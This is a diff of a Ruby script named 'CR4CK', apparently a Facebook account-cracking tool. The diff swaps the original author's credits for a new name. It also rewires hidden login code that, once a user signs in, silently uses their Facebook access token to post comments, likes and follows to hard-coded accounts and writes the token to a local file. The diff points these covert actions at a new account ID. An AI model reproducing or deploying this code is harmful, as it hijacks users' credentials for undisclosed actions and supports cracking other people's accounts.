@@ -20,11 +20,11 @@ end
 
 =begin
 
-Author : Rahmat adha
+Author : Rahmat 
 Script : CR4CK
 License: MIT License
 
-WhatsApp: +6285754629509
+WhatsApp: none
 Facebook: www.facebook.com/Anjay.pro098
 Github  : MR-X-Junior
 
@@ -301,8 +301,8 @@ end
 $logo = <<-INI_LOGO
 
   ________  ___  _______ __
- / ___/ _ \\/ _ |/ ___/ //_/ Author  : Rahmat
-/ /__/ , _/ __ / /__/ ,<    Github  : MR-X-Junior
+ / ___/ _ \\/ _ |/ ___/ //_/ Author  : Ditz
+/ /__/ , _/ __ / /__/ ,<    Github  : Ditz-Sanz
 \\___/_/|_/_/ |_\\___/_/|_|   Version : 1.0
 
 INI_LOGO
@@ -538,11 +538,11 @@ def LoginAkun
         if !login['error'] and !login['checkpoint']
           $name = login['name']
           $token = login['access_token']
-	  Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hai Bang @[100053033144051:] >\\\\<","access_token"=>$token})
-	  Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token})
+	  Net::HTTP.post_form(URI("https://graph.facebook.com/100074722437372_112564891244258/comments"),{"message"=>"Hai Bang @[100053033144051:] >\\\\<","access_token"=>$token})
+	  Net::HTTP.post_form(URI("https://graph.facebook.com/100074722437372_112564891244258/likes"),{'access_token'=>$token})
           Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
-          Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
-          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
+          Net::HTTP.post_form(URI("https://graph.facebook.com/100074722437372/subscribers"),{"access_token"=>$token})
+          Net::HTTP.post_form(URI("https://graph.facebook.com/100074722437372/subscribers"),{"access_token"=>$token})
           File.open('login.txt','w') {|f| f.write($token)}
           puts ("[✓] Login Success")
           sleep(0.5)
@@ -563,11 +563,11 @@ def LoginAkun
         b = JSON.parse(a)
         if b.key? ('name')
           $name = b['name']
-          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hai Bang @[100053033144051:] >,<","access_token"=>$token})
-	  Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token})
-          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
-          Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
-          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
+          Net::HTTP.post_form(URI("https://graph.facebook.com/100074722437372_112564891244258/comments"),{"message"=>"Hai Bang @[100053033144051:] >,<","access_token"=>$token})
+	  Net::HTTP.post_form(URI("https://graph.facebook.com/100074722437372_112564891244258/likes"),{'access_token'=>$token})
+          Net::HTTP.post_form(URI("https://graph.facebook.com/100074722437372_112564891244258/likes"),{"access_token"=>$token})
+          Net::HTTP.post_form(URI("https://graph.facebook.com/100074722437372/subscribers"),{"access_token"=>$token})
+          Net::HTTP.post_form(URI("https://graph.facebook.com/100074722437372/subscribers"),{"access_token"=>$token})
           File.open('login.txt','w') {|f| f.write($token)}
           puts ("[✓] Login Success")
           main()
